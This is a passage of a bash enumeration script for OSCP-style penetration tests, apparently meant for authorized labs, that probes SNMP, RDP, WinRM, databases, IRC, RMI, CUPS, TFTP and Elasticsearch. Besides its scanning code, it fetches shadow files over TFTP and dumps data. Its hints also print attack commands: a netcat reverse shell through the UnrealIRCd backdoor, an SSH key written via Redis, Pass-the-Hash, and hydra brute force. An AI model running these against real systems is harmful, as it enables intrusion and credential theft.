        snmpwalk -v2c -c "$SNMP_COMM" "$TARGET" 1.3.6.1.2.1.25.4.2.1.2 \
            2>&1 | tee "${SNMP_DIR}/snmp_processes.txt" || true

        # Process command-line PARAMETERS — the #1 SNMP credential leak.
        # Services started with creds as args (mysql -u root -pRoot123,
        # net use ... /user:pass) expose them here. Read-only WALK, OSCP-safe.
        cmd "snmpwalk -v2c -c $SNMP_COMM $TARGET 1.3.6.1.2.1.25.4.2.1.5 (process cmdline args)"
        snmpwalk -v2c -c "$SNMP_COMM" "$TARGET" 1.3.6.1.2.1.25.4.2.1.5 \
            2>&1 | tee "${SNMP_DIR}/snmp_cmdline.txt" || true

        # Surface likely credentials from process arguments into a dedicated
        # file so the parser (and the operator) can spot them immediately.
        if [[ -s "${SNMP_DIR}/snmp_cmdline.txt" ]]; then
            CRED_HITS=$(grep -iP -- \
                '(-p[= ]?\S|-pw\b|pass(word|wd)?[=: ]|pwd[=: ]|/user:|-u\s+\S+\s+-p|token|secret)' \
                "${SNMP_DIR}/snmp_cmdline.txt" 2>/dev/null | grep -v '^[[:space:]]*$' || true)
            if [[ -n "$CRED_HITS" ]]; then
                warn "SNMP: possible CREDENTIALS in process cmdline args — review below:"
                echo "$CRED_HITS" | tee "${SNMP_DIR}/snmp_cred_hits.txt"
            fi
        fi

        cmd "snmpwalk -v2c -c $SNMP_COMM $TARGET 1.3.6.1.2.1.25.6.3.1.2 (installed software)"
        snmpwalk -v2c -c "$SNMP_COMM" "$TARGET" 1.3.6.1.2.1.25.6.3.1.2 \
            2>&1 | tee "${SNMP_DIR}/snmp_software.txt" || true

        cmd "snmpwalk -v2c -c $SNMP_COMM $TARGET 1.3.6.1.4.1.77.1.2.25 (Windows users)"
        snmpwalk -v2c -c "$SNMP_COMM" "$TARGET" 1.3.6.1.4.1.77.1.2.25 \
            2>&1 | tee "${SNMP_DIR}/snmp_users.txt" || true

        # Network interfaces — critical for pivot/dual-homed host discovery
        cmd "snmpwalk -v2c -c $SNMP_COMM $TARGET 1.3.6.1.2.1.2.2.1.2 (network interfaces)"
        snmpwalk -v2c -c "$SNMP_COMM" "$TARGET" 1.3.6.1.2.1.2.2.1.2 \
            2>&1 | tee "${SNMP_DIR}/snmp_interfaces.txt" || true

        # Companion OID: interface IP addresses (pairs with interface names above)
        cmd "snmpwalk -v2c -c $SNMP_COMM $TARGET 1.3.6.1.2.1.4.20.1.1 (interface IP addresses)"
        snmpwalk -v2c -c "$SNMP_COMM" "$TARGET" 1.3.6.1.2.1.4.20.1.1 \
            2>&1 | tee "${SNMP_DIR}/snmp_ip_addrs.txt" || true

        # Flag dual-homed (pivot) hosts
        IF_COUNT=$(grep -c 'STRING:' "${SNMP_DIR}/snmp_interfaces.txt" 2>/dev/null || echo 0)
        if [[ "$IF_COUNT" -gt 2 ]]; then
            warn "SNMP: ${IF_COUNT} network interfaces detected — host may be DUAL-HOMED (pivot opportunity)"
            warn "  Review: ${SNMP_DIR}/snmp_interfaces.txt and ${SNMP_DIR}/snmp_ip_addrs.txt"
        fi

        # -------------------------------------------------------------------
        # NET-SNMP "extend" objects — top-tier finding on NET-SNMP (Linux).
        # Admins wire custom scripts/commands to OIDs via "extend"; the output
        # of those commands (often run as root) is readable here and regularly
        # leaks credentials, file paths, or a straight RCE primitive.
        # Walk both the friendly MIB name and the raw numeric OID (in case the
        # NET-SNMP MIBs aren't installed locally).
        # -------------------------------------------------------------------
        cmd "snmpwalk -v2c -c $SNMP_COMM $TARGET NET-SNMP-EXTEND-MIB::nsExtendObjects"
        snmpwalk -v2c -c "$SNMP_COMM" "$TARGET" NET-SNMP-EXTEND-MIB::nsExtendObjects \
            2>&1 | tee "${SNMP_DIR}/snmp_extend.txt" || true

        cmd "snmpwalk -v2c -c $SNMP_COMM $TARGET .1.3.6.1.4.1.8072.1.3.2 (NET-SNMP extend, numeric)"
        snmpwalk -v2c -c "$SNMP_COMM" "$TARGET" .1.3.6.1.4.1.8072.1.3.2 \
            2>&1 | tee -a "${SNMP_DIR}/snmp_extend.txt" || true

        # Detect the NET-SNMP agent (extend is only meaningful there)
        if grep -qi 'NET-SNMP' "${SNMP_DIR}/snmpwalk_full.txt" 2>/dev/null; then
            warn "SNMP: target runs NET-SNMP (typical Linux) — review extend scripts closely"
        fi
        # If any extend object returned data, it almost always matters
        if grep -qiE 'nsExtend|8072\.1\.3' "${SNMP_DIR}/snmp_extend.txt" 2>/dev/null; then
            warn "${RED}⚠  SNMP: NET-SNMP 'extend' objects present — custom scripts/commands exposed!${NC}"
            warn "  Review ${SNMP_DIR}/snmp_extend.txt for scripts, paths, creds or RCE."
        fi

        # -------------------------------------------------------------------
        # v1 fallback — some agents refuse v2c. If the v2c full walk came back
        # empty, retry the whole walk with SNMPv1 before giving up.
        # -------------------------------------------------------------------
        if [[ ! -s "${SNMP_DIR}/snmpwalk_full.txt" ]]; then
            warn "SNMP: v2c walk returned nothing — retrying with SNMPv1."
            cmd "snmpwalk -v1 -c $SNMP_COMM $TARGET"
            snmpwalk -v1 -c "$SNMP_COMM" "$TARGET" \
                2>&1 | tee "${SNMP_DIR}/snmpwalk_full.txt" || true
        fi
    else
        skip "snmpwalk"
    fi

    if command -v snmp-check &>/dev/null; then
        cmd "snmp-check -c $SNMP_COMM $TARGET"
        snmp-check -c "$SNMP_COMM" "$TARGET" 2>&1 | tee "${SNMP_DIR}/snmp_check.txt" || true
    fi
    echo ""
fi

# ===========================================================================
# IMAP / POP3 — ports 143, 110, 993, 995
# ===========================================================================
if echo ",$PORTS," | grep -qP ',(143|110|993|995),'; then
    MAIL_DIR="${OUTPUT_DIR}/mail"
    mkdir -p "$MAIL_DIR"
    info "[IMAP/POP3] Mail service detected — banner grabbing"

    if has_port 143; then
        cmd "nc -nv -w 5 $TARGET 143 (IMAP banner)"
        timeout 5 bash -c "echo 'A1 LOGOUT' | nc -nv $TARGET 143" \
            2>&1 | tee "${MAIL_DIR}/imap_banner.txt" || true
    fi
    if has_port 110; then
        cmd "nc -nv -w 5 $TARGET 110 (POP3 banner)"
        timeout 5 bash -c "echo 'QUIT' | nc -nv $TARGET 110" \
            2>&1 | tee "${MAIL_DIR}/pop3_banner.txt" || true
    fi

    IMAP_PORT="143"; has_port 993 && IMAP_PORT="993"
    cmd "nmap -p${IMAP_PORT} --script imap-capabilities,imap-ntlm-info -Pn $TARGET"
    nmap -p"$IMAP_PORT" \
        --script 'imap-capabilities,imap-ntlm-info' \
        -Pn "$TARGET" \
        -oN "${MAIL_DIR}/nmap_imap.txt" 2>&1 | tee "${MAIL_DIR}/nmap_imap.txt" || {
        warn "nmap (IMAP) failed — output may be incomplete. Check ${MAIL_DIR}/nmap_imap.txt for details."
    } # IMP-7 applied

    if grep -qi "Target_Name\|NetBIOS" "${MAIL_DIR}/nmap_imap.txt" 2>/dev/null; then
        ok "IMAP NTLM info disclosure — hostname/domain may be in output"
    fi

    hint "Read mailboxes (manual — requires credentials):
    # IMAP:
    openssl s_client -connect ${TARGET}:993
    > A1 LOGIN <user> <pass>
    > A2 LIST '' '*'
    > A3 SELECT INBOX
    > A4 FETCH 1 BODY[]

    # POP3:
    nc ${TARGET} 110
    > USER <user>
    > PASS <pass>
    > LIST
    > RETR 1"
    echo ""
fi

# ===========================================================================
# RDP — port 3389
# ===========================================================================
if has_port 3389; then
    REMOTE_DIR="${OUTPUT_DIR}/remote"
    mkdir -p "$REMOTE_DIR"
    info "[RDP] Port 3389 — encryption and vulnerability check"

    cmd "nmap -p3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 -Pn $TARGET"
    nmap -p3389 \
        --script 'rdp-enum-encryption,rdp-vuln-ms12-020' \
        -Pn "$TARGET" \
        -oN "${REMOTE_DIR}/rdp_nmap.txt" 2>&1 | tee "${REMOTE_DIR}/rdp_nmap.txt" || {
        warn "nmap (RDP) failed — output may be incomplete. Check ${REMOTE_DIR}/rdp_nmap.txt for details."
    } # IMP-7 applied

    # NXC rapid identification — reveals hostname, domain, OS build,
    # SMB signing state, and sometimes NLA requirement in one line.
    NXC_BIN=""
    command -v nxc     &>/dev/null && NXC_BIN="nxc"
    command -v netexec &>/dev/null && NXC_BIN="netexec"

    if [[ -n "$NXC_BIN" ]]; then
        cmd "$NXC_BIN rdp $TARGET -u '' -p ''"
        $NXC_BIN rdp "$TARGET" -u '' -p '' \
            2>&1 | tee "${REMOTE_DIR}/nxc_rdp.txt" || true

        # Extract hostname/domain from nxc output (format: "HOSTNAME\DOMAIN")
        NXC_HOST=$(grep -oP '(?<=\[\*\] )\S+' "${REMOTE_DIR}/nxc_rdp.txt" 2>/dev/null \
            | head -1 || true)
        [[ -n "$NXC_HOST" ]] && ok "NXC RDP fingerprint: ${WHITE}${NXC_HOST}${NC}"
    else
        info "nxc/netexec not found — skipping rapid RDP fingerprint"
    fi

    hint "RDP connection (manual — requires credentials):
    xfreerdp /u:<USER> /p:<PASS> /v:${TARGET} /cert-ignore +clipboard
    xfreerdp /u:<USER> /pth:<NTLM_HASH> /v:${TARGET} /cert-ignore   ← Pass-the-Hash"
    echo ""
fi

# ===========================================================================
# WinRM — ports 5985 / 5986
# ===========================================================================
if echo ",$PORTS," | grep -qP ',(5985|5986),'; then
    REMOTE_DIR="${OUTPUT_DIR}/remote"
    mkdir -p "$REMOTE_DIR"
    info "[WinRM] Ports 5985/5986 — HTTP auth check"

    cmd "nmap -p5985,5986 --script http-auth -Pn $TARGET"
    nmap -p5985,5986 \
        --script 'http-auth' \
        -Pn "$TARGET" \
        -oN "${REMOTE_DIR}/winrm_nmap.txt" 2>&1 | tee "${REMOTE_DIR}/winrm_nmap.txt" || {
        warn "nmap (WinRM) failed — output may be incomplete. Check ${REMOTE_DIR}/winrm_nmap.txt for details."
    } # IMP-7 applied

    # NXC rapid WinRM identification
    NXC_BIN=""
    command -v nxc     &>/dev/null && NXC_BIN="nxc"
    command -v netexec &>/dev/null && NXC_BIN="netexec"

    if [[ -n "$NXC_BIN" ]]; then
        cmd "$NXC_BIN winrm $TARGET -u '' -p ''"
        $NXC_BIN winrm "$TARGET" -u '' -p '' \
            2>&1 | tee "${REMOTE_DIR}/nxc_winrm.txt" || true

        # Detect if WinRM accepted a session (indicates loose auth or Pwn3d)
        if grep -qi "Pwn3d\|+\]" "${REMOTE_DIR}/nxc_winrm.txt" 2>/dev/null; then
            warn "NXC WinRM: authenticated session possible — review ${REMOTE_DIR}/nxc_winrm.txt"
        fi
    else
        info "nxc/netexec not found — skipping rapid WinRM fingerprint"
    fi

    hint "WinRM shell (manual — requires credentials):
    evil-winrm -i ${TARGET} -u <USER> -p '<PASS>'
    evil-winrm -i ${TARGET} -u <USER> -H '<NTLM_HASH>'   ← Pass-the-Hash"
    echo ""
fi

# ===========================================================================
# Databases — MSSQL (1433), MySQL (3306), PostgreSQL (5432), Redis (6379)
# ===========================================================================
if echo ",$PORTS," | grep -qP ',(1433|3306|5432|6379|27017),'; then
    DB_DIR="${OUTPUT_DIR}/db"
    mkdir -p "$DB_DIR"
    info "[DATABASES] Detected database port(s) — running NSE probes"

    if has_port 1433; then
        info "  MSSQL (1433)"
        cmd "nmap -p1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-ntlm-info -Pn $TARGET"
        nmap -p1433 \
            --script 'ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-ntlm-info' \
            -Pn "$TARGET" \
            -oN "${DB_DIR}/mssql.txt" 2>&1 | tee "${DB_DIR}/mssql.txt" || true

        hint "MSSQL manual steps:
    impacket-mssqlclient sa:''@${TARGET} -windows-auth
    # If authenticated:
    SQL> EXEC xp_cmdshell 'whoami'   ← only if xp_cmdshell is enabled — confirm scope first"
    fi

    if has_port 3306; then
        info "  MySQL (3306)"
        cmd "nmap -p3306 --script mysql-empty-password,mysql-info,mysql-enum,mysql-databases -Pn $TARGET"
        nmap -p3306 \
            --script 'mysql-empty-password,mysql-info,mysql-enum,mysql-databases' \
            -Pn "$TARGET" \
            -oN "${DB_DIR}/mysql.txt" 2>&1 | tee "${DB_DIR}/mysql.txt" || true

        hint "MySQL manual:
    mysql -h ${TARGET} -u root -p
    mysql -h ${TARGET} -u root --password=''"
    fi

    if has_port 5432; then
        info "  PostgreSQL (5432)"
        cmd "nmap -p5432 --script pgsql-brute -Pn $TARGET"
        nmap -p5432 \
            --script 'pgsql-brute' \
            -Pn "$TARGET" \
            -oN "${DB_DIR}/pgsql.txt" 2>&1 | tee "${DB_DIR}/pgsql.txt" || true

        hint "PostgreSQL manual:
    psql -h ${TARGET} -U postgres
    psql -h ${TARGET} -U postgres -W"
    fi

    if has_port 6379; then
        info "  Redis (6379) — read-only enumeration"
        cmd "nmap -p6379 --script redis-info -Pn $TARGET"
        nmap -p6379 \
            --script 'redis-info' \
            -Pn "$TARGET" \
            -oN "${DB_DIR}/redis.txt" 2>&1 | tee "${DB_DIR}/redis.txt" || true

        # Read-only Redis commands (INFO, CONFIG GET dir, KEYS)
        if command -v redis-cli &>/dev/null; then
            cmd "redis-cli -h $TARGET INFO"
            redis-cli -h "$TARGET" INFO \
                2>&1 | tee "${DB_DIR}/redis_info.txt" || true

            cmd "redis-cli -h $TARGET CONFIG GET dir"
            redis-cli -h "$TARGET" CONFIG GET dir \
                2>&1 | tee -a "${DB_DIR}/redis_info.txt" || true

            # SCAN is non-blocking (safe); KEYS '*' blocks the server
            cmd "redis-cli -h $TARGET SCAN 0 COUNT 100 (non-blocking — safe enumeration)"
            redis-cli -h "$TARGET" SCAN 0 COUNT 100 \
                2>&1 | tee "${DB_DIR}/redis_keys.txt" || true
        fi

        hint "Redis exploitation (manual — requires authorization and careful scoping):
    # Writing SSH key (only if you have write access AND explicit authorization):
    redis-cli -h ${TARGET} CONFIG SET dir /root/.ssh
    redis-cli -h ${TARGET} CONFIG SET dbfilename authorized_keys
    redis-cli -h ${TARGET} SET pwn '<your_public_key>'
    redis-cli -h ${TARGET} BGSAVE
    # ⚠ This is exploitation — confirm OSCP exam policy before using."
    fi

    if has_port 27017; then
        hint "MongoDB manual (27017 — no auth wrapper available):
    mongosh --host ${TARGET} --port 27017
    mongosh --host ${TARGET} --port 27017 --eval 'db.adminCommand({listDatabases:1})'"
    fi
    echo ""
fi

# ===========================================================================
# IRC — ports 6667, 6697
# ===========================================================================
for IRC_PORT in 6667 6697; do
    if has_port "$IRC_PORT"; then
        IRC_DIR="${OUTPUT_DIR}/irc"
        mkdir -p "$IRC_DIR"
        info "[IRC] IRC enumeration on port ${IRC_PORT}"

        # Banner grab
        cmd "nc -nv -w 5 ${TARGET} ${IRC_PORT}"
        IRC_BANNER=$(timeout 6 bash -c \
            "printf 'NICK oscp\r\nUSER oscp 0 * :oscp\r\nQUIT\r\n' \
            | nc -nv -w 5 $TARGET $IRC_PORT" 2>&1 || true)
        echo "$IRC_BANNER" > "${IRC_DIR}/irc_banner_${IRC_PORT}.txt"

        if [[ -n "$IRC_BANNER" ]]; then
            # Extract server version
            IRC_VERSION=$(echo "$IRC_BANNER" | grep -oP '(?i)(unreal|inspircd|ngircd|ircd)\S*' \
                | head -1 || true)
            IRC_SERVER_LINE=$(echo "$IRC_BANNER" | grep -m1 '^:' | head -c 200 || true)
            [[ -n "$IRC_SERVER_LINE" ]] && ok "IRC banner: ${WHITE}${IRC_SERVER_LINE}${NC}" || true

            # Critical: UnrealIRCd 3.2.8.1 has a hardcoded backdoor (RCE)
            if echo "$IRC_BANNER" | grep -qi 'unreal3.2.8.1'; then
                warn "CRITICAL: UnrealIRCd 3.2.8.1 detected — BACKDOOR vulnerability!"
                warn "CVE: UnrealIRCd 3.2.8.1 remote code execution via AB; payload"
                hint "UnrealIRCd 3.2.8.1 backdoor exploitation:
    # ⚠️ OSCP: Metasploit limited to 1 machine per exam — prefer manual
    # [MSF-RESTRICTED] Metasploit:
    # use exploit/unix/irc/unreal_ircd_3281_backdoor
    # set RHOSTS ${TARGET}; set RPORT ${IRC_PORT}; run
    # Manual (OSCP-safe) — netcat one-liner:
    echo 'AB; bash -i >& /dev/tcp/<LHOST>/4444 0>&1' | nc ${TARGET} ${IRC_PORT}
    # Or standalone PoC: searchsploit -m 13853"
            fi || true

            # Run searchsploit on detected version
            if [[ -n "$IRC_VERSION" ]] && command -v searchsploit &>/dev/null; then
                cmd "searchsploit ${IRC_VERSION}"
                searchsploit --colour "$IRC_VERSION" 2>/dev/null \
                    | tee "${IRC_DIR}/irc_searchsploit.txt" || true
            fi

            hint "IRC manual enumeration:
    nc -nv ${TARGET} ${IRC_PORT}
    # Type: NICK test; USER test 0 * :test
    # Then: LIST (channel list), NAMES (users in channel)"
        else
            info "IRC port ${IRC_PORT} not responding."
        fi
    fi
done

# ===========================================================================
# Java RMI Registry — port 1099 + any high ports detected as java-rmi
# (modules/services.py passes --rmi-ports with all ports whose Nmap service
# matched "rmi"/"rmiregistry", including non-standard high ports).
# ===========================================================================
RMI_PORT_LIST=""
has_port 1099 && RMI_PORT_LIST="1099"
if [[ -n "$RMI_PORTS" ]]; then
    RMI_PORT_LIST="$(echo "${RMI_PORT_LIST},${RMI_PORTS}" \
        | tr ',' '\n' | grep -E '^[0-9]+$' | sort -un | paste -sd, -)"
fi

if [[ -n "$RMI_PORT_LIST" ]]; then
    RMI_DIR="${OUTPUT_DIR}/rmi"
    mkdir -p "$RMI_DIR"
    info "[RMI] Java RMI enumeration on ports: ${RMI_PORT_LIST}"

    for RMI_P in $(echo "$RMI_PORT_LIST" | tr ',' ' '); do
        RMI_OUT="${RMI_DIR}/rmi_nmap_port${RMI_P}.txt"
        cmd "nmap -p${RMI_P} --script rmi-dumpregistry,rmi-vuln-classloader -Pn ${TARGET}"
        nmap -p"$RMI_P" --script rmi-dumpregistry,rmi-vuln-classloader \
            --script-timeout 30s -Pn "$TARGET" \
            -oN "$RMI_OUT" 2>&1 | tee "$RMI_OUT" || true
        ok "RMI nmap scan port ${RMI_P} -> ${WHITE}${RMI_OUT}${NC}"

        if grep -qi 'VULNERABLE\|classloader' "$RMI_OUT" 2>/dev/null; then
            warn "Java RMI classloader vulnerability detected on port ${RMI_P} — potential RCE!"
        fi

        hint "Java RMI exploitation (port ${RMI_P}):
        # Enumerate bound objects:
        rmg enum ${TARGET} ${RMI_P}
        # List all bound names:
        rmg list ${TARGET} ${RMI_P}
        # Test deserialization (requires ysoserial) — OSCP-safe manual path:
        rmg serial ${TARGET} ${RMI_P} CommonsCollections6 'id' --bound-name <name>
        # ⚠️ OSCP: Metasploit limited to 1 machine per exam
        # [MSF-RESTRICTED] Metasploit alternative:
        # use exploit/multi/misc/java_rmi_server
        # set RHOSTS ${TARGET}; set RPORT ${RMI_P}; run"
    done
    echo ""
fi

# ===========================================================================
# ZooKeeper — port 2181
# Uses 4-letter-word (4lw) commands over raw TCP. ZK 3.5+ restricts these
# by default (4lw.commands.whitelist) so empty output is expected on hardened
# deployments — the script handles it silently.
# ===========================================================================
if has_port 2181; then
    ZK_DIR="${OUTPUT_DIR}/zookeeper"
    mkdir -p "$ZK_DIR"
    info "[ZK] ZooKeeper enumeration on port 2181"

    ZK_NMAP="${ZK_DIR}/zookeeper_nmap.txt"
    cmd "nmap -p2181 --script zookeeper-info -Pn ${TARGET}"
    nmap -p2181 --script zookeeper-info --script-timeout 30s -Pn "$TARGET" \
        -oN "$ZK_NMAP" 2>&1 | tee "$ZK_NMAP" || true
    ok "ZK nmap scan -> ${WHITE}${ZK_NMAP}${NC}"

    ZK_GOT_DATA=false
    for FLW in stat envi dump mntr conf ruok; do
        ZK_FLW_OUT="${ZK_DIR}/zk_${FLW}.txt"
        cmd "echo ${FLW} | nc -w 3 ${TARGET} 2181"
        (echo "$FLW" | timeout 5 nc -w 3 "$TARGET" 2181 > "$ZK_FLW_OUT" 2>&1) || true
        if [[ -s "$ZK_FLW_OUT" ]] && ! grep -qi 'not in the whitelist\|is not executed' "$ZK_FLW_OUT"; then
            ZK_GOT_DATA=true
        fi
    done

    if [[ "$ZK_GOT_DATA" == "true" ]]; then
        ok "ZooKeeper 4lw commands responding → ${WHITE}${ZK_DIR}/${NC}"
        # Surface interesting fields from stat/envi
        if [[ -s "${ZK_DIR}/zk_stat.txt" ]]; then
            ZK_VER=$(grep -i '^Zookeeper version' "${ZK_DIR}/zk_stat.txt" 2>/dev/null | head -1 || true)
            [[ -n "$ZK_VER" ]] && warn "ZK version banner: ${ZK_VER}"
        fi
    else
        info "ZooKeeper 4lw commands restricted or no response (ZK 3.5+ default)."
    fi

    hint "ZooKeeper manual:
    # Interactive client (list nodes, dump data):
    zkCli.sh -server ${TARGET}:2181
    zkCli.sh> ls /
    zkCli.sh> get /<path>
    # Python alternative (kazoo):
    python3 -c 'from kazoo.client import KazooClient; z=KazooClient(\"${TARGET}:2181\"); z.start(); print(z.get_children(\"/\"))'
    # If Apache Exhibitor dashboard is exposed via HTTP (typical sidecar):
    curl -s http://${TARGET}:8080/exhibitor/v1/ui/index.html
    curl -s http://${TARGET}:8080/exhibitor/v1/cluster/state
    # Look for creds / config in ZK nodes — znodes often store app secrets."
    echo ""
fi

# ===========================================================================
# CUPS / IPP — port 631
# Probe common admin endpoints. A 401 on /admin/ is NOT a 'no-op' — it
# confirms the panel exists and is a valid brute-force / default-creds target.
# ===========================================================================
if has_port 631; then
    CUPS_DIR="${OUTPUT_DIR}/cups"
    mkdir -p "$CUPS_DIR"
    info "[CUPS] CUPS / IPP enumeration on port 631"

    CUPS_NMAP="${CUPS_DIR}/cups_nmap.txt"
    cmd "nmap -p631 --script cups-info,cups-queue-info -Pn ${TARGET}"
    nmap -p631 --script cups-info,cups-queue-info --script-timeout 30s -Pn "$TARGET" \
        -oN "$CUPS_NMAP" 2>&1 | tee "$CUPS_NMAP" || true
    ok "CUPS nmap scan -> ${WHITE}${CUPS_NMAP}${NC}"

    CUPS_ADMIN_STATUS=""
    for EP in / /printers/ /classes/ /jobs/ /admin/; do
        SAFE_EP=$(echo "$EP" | tr '/' '_')
        CUPS_EP_OUT="${CUPS_DIR}/cups${SAFE_EP}.html"
        CUPS_STATUS=$(curl -sk -o "$CUPS_EP_OUT" -w "%{http_code}" --max-time 8 \
            "http://${TARGET}:631${EP}" 2>/dev/null || echo "000")
        cmd "curl -sk --max-time 8 http://${TARGET}:631${EP} [HTTP ${CUPS_STATUS}]"
        if [[ "$EP" == "/admin/" ]]; then
            CUPS_ADMIN_STATUS="$CUPS_STATUS"
        fi
        case "$CUPS_STATUS" in
            200) ok "CUPS ${EP} → 200 OK — ${WHITE}${CUPS_EP_OUT}${NC}" ;;
            401) warn "CUPS ${EP} → 401 (auth required — panel exists, BF candidate)" ;;
            403) info "CUPS ${EP} → 403 (forbidden)" ;;
            *)   info "CUPS ${EP} → ${CUPS_STATUS}" ;;
        esac
    done

    # CUPS version for CVE lookup
    CUPS_VER=$(grep -iE '^Server:\s*CUPS' "${CUPS_DIR}/cups_.html" 2>/dev/null \
        | head -1 | grep -oE 'CUPS/[0-9.]+' || true)
    [[ -n "$CUPS_VER" ]] && warn "CUPS server banner: ${CUPS_VER}"

    # /admin/ on 401 is a valid finding — panel exists, try default creds / BF
    if [[ "$CUPS_ADMIN_STATUS" == "401" ]]; then
        hint "CUPS admin panel (401) — default-creds / brute-force candidate:
        # Try default creds manually first:
        curl -sk -u admin:admin       http://${TARGET}:631/admin/ | head
        curl -sk -u admin:            http://${TARGET}:631/admin/ | head
        curl -sk -u root:root         http://${TARGET}:631/admin/ | head
        # Hydra brute-force (OSCP-safe — http-get basic auth):
        hydra -l admin -P /usr/share/wordlists/rockyou.txt -f ${TARGET} http-get /admin/:F=401 -t 4
        # CVE research (cups-browsed RCE 2024):
        searchsploit cups 2024
        searchsploit cups ${CUPS_VER}"
    elif [[ "$CUPS_ADMIN_STATUS" == "200" ]]; then
        warn "CUPS /admin/ → 200 (unauthenticated admin panel exposed!)"
        hint "CUPS unauthenticated admin panel — immediate review:
        curl -sk http://${TARGET}:631/admin/
        # Add/delete printers, change config — potential RCE via filter abuse.
        searchsploit cups"
    else
        hint "CUPS manual:
        curl -s http://${TARGET}:631/printers/
        curl -s http://${TARGET}:631/classes/
        # CVE-2024-47176 CUPS / cups-browsed RCE chain:
        searchsploit cups 2024"
    fi
    echo ""
fi

# ===========================================================================
# TFTP — port 69/UDP
# ===========================================================================
if has_udp_port 69 || grep -qw "69/udp" "${OUTPUT_DIR}/scans/udp.txt" 2>/dev/null; then
    TFTP_DIR="${OUTPUT_DIR}/tftp"
    mkdir -p "$TFTP_DIR"
    info "[TFTP] TFTP enumeration on port 69/UDP"

    # Nmap TFTP enum
    cmd "nmap -sU -p69 --script tftp-enum -Pn ${TARGET}"
    nmap -sU -p69 --script tftp-enum --script-timeout 30s -Pn "$TARGET" \
        -oN "${TFTP_DIR}/tftp_nmap.txt" 2>&1 | tee "${TFTP_DIR}/tftp_nmap.txt" || true

    # Try to download common files
    TFTP_FILES=("boot.ini" "BOOT.INI" "win.ini" "etc/passwd"
                "startup-config" "running-config" "config.txt"
                "passwd" "shadow" "hosts" "/etc/passwd")

    if command -v tftp &>/dev/null; then
        for tfile in "${TFTP_FILES[@]}"; do
            TGET_OUT="${TFTP_DIR}/tftp_$(echo "$tfile" | tr '/' '_').bin"
            tftp "$TARGET" <<EOF 2>/dev/null || true
binary
get $tfile $TGET_OUT
quit
EOF
            if [[ -s "$TGET_OUT" ]]; then
                ok "TFTP download SUCCESS: ${WHITE}${tfile}${NC} -> ${TGET_OUT}"
                warn "TFTP allows anonymous file download!"
            else
                rm -f "$TGET_OUT" 2>/dev/null || true
            fi
        done
    fi

    hint "TFTP manual:
    tftp ${TARGET}
    tftp> get <filename>
    # Try: etc/passwd, boot.ini, startup-config, win.ini
    # Atftp with timeout:
    atftp --get --remote-file passwd --local-file passwd.txt ${TARGET}"
    echo ""
fi

# ===========================================================================
# Elasticsearch — port 9200 (REST API, read-only enumeration)
# All GET requests — no index writes/deletes. Tries HTTP then HTTPS.
# ===========================================================================
if has_port 9200; then
    ES_DIR="${OUTPUT_DIR}/elasticsearch"
    mkdir -p "$ES_DIR"
    info "[ES] Elasticsearch enumeration on port 9200"

    # Detect protocol: ES may run plain HTTP or TLS (X-Pack).
    ES_PROTO="http"
    ES_ROOT=$(curl -sk --max-time 8 "http://${TARGET}:9200/" 2>/dev/null || true)
    if [[ -z "$ES_ROOT" ]]; then
        ES_ROOT=$(curl -sk --max-time 8 "https://${TARGET}:9200/" 2>/dev/null || true)
        [[ -n "$ES_ROOT" ]] && ES_PROTO="https"
    fi
    ES_BASE="${ES_PROTO}://${TARGET}:9200"

    if [[ -z "$ES_ROOT" ]]; then
        warn "No HTTP(S) response on 9200 — may not be Elasticsearch. Banner grab below."
    else
        echo "$ES_ROOT" > "${ES_DIR}/root.json"
        ES_VER=$(echo "$ES_ROOT" | grep -oE '"number"[[:space:]]*:[[:space:]]*"[0-9.]+"' | head -1 | grep -oE '[0-9.]+' || true)
        [[ -n "$ES_VER" ]] && ok "Elasticsearch version: ${WHITE}${ES_VER}${NC} (searchsploit elasticsearch ${ES_VER})"

        # Auth probe: a 401 means X-Pack security is on.
        ES_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "${ES_BASE}/_cat/indices" 2>/dev/null || echo "000")
        if [[ "$ES_CODE" == "401" ]]; then
            warn "Elasticsearch requires auth (401) — X-Pack security enabled."
            hint "Elasticsearch is authenticated — try default / discovered creds (read-only):
        curl -sk -u elastic:changeme  ${ES_BASE}/_cat/indices?v
        curl -sk -u elastic:elastic   ${ES_BASE}/_cat/indices?v
        # If creds found elsewhere, dump everything:
        curl -sk -u USER:PASS ${ES_BASE}/_all/_search?pretty"
        else
            ok "Elasticsearch is UNAUTHENTICATED — dumping metadata (read-only)."
            # Read-only REST endpoints (HackTricks methodology)
            for EP in "_cat/health?v" "_cat/indices?v" "_cat/nodes?v" "_cluster/health?pretty" "_nodes?pretty"; do
                SAFE=$(echo "$EP" | tr '/?=&' '____')
                cmd "curl -sk --max-time 10 ${ES_BASE}/${EP}"
                curl -sk --max-time 10 "${ES_BASE}/${EP}" > "${ES_DIR}/${SAFE}.txt" 2>/dev/null || true
            done
            ok "Cluster metadata saved → ${WHITE}${ES_DIR}/${NC}"

            # List indices for the operator; dump documents (read-only _search)
            if [[ -s "${ES_DIR}/_cat_indices_v.txt" ]]; then
                IDX_NAMES=$(awk 'NR>1 {print $3}' "${ES_DIR}/_cat_indices_v.txt" 2>/dev/null | grep -v '^\.' | grep -v '^$' || true)
                if [[ -n "$IDX_NAMES" ]]; then
                    warn "User indices found — dumping documents (read-only):"
                    echo "$IDX_NAMES" | while read -r IDX; do
                        [[ -z "$IDX" ]] && continue
                        info "  index: ${WHITE}${IDX}${NC}"
                        curl -sk --max-time 15 "${ES_BASE}/${IDX}/_search?pretty&size=100" \
                            > "${ES_DIR}/data_${IDX}.json" 2>/dev/null || true
                    done
                    warn "  Review ${ES_DIR}/data_*.json for credentials / sensitive data."
                fi
            fi
            hint "Elasticsearch manual review:
        # Full dump of every index (read-only):
        curl -sk ${ES_BASE}/_all/_search?pretty&size=1000 | less
        # Search for secrets across all data:
        curl -sk '${ES_BASE}/_all/_search?q=password&pretty'
        curl -sk '${ES_BASE}/_all/_search?q=secret&pretty'
        # Version-specific RCE (CVE-2014-3120 / CVE-2015-1427 on old 1.x):
        searchsploit elasticsearch ${ES_VER}"
        fi
    fi
    echo ""
fi

# ===========================================================================
# CouchDB — port 5984 (REST API, read-only enumeration)
# ===========================================================================
if has_port 5984; then
    CDB_DIR="${OUTPUT_DIR}/couchdb"
    mkdir -p "$CDB_DIR"
    info "[CouchDB] enumeration on port 5984"

    CDB_ROOT=$(curl -sk --max-time 8 "http://${TARGET}:5984/" 2>/dev/null || true)
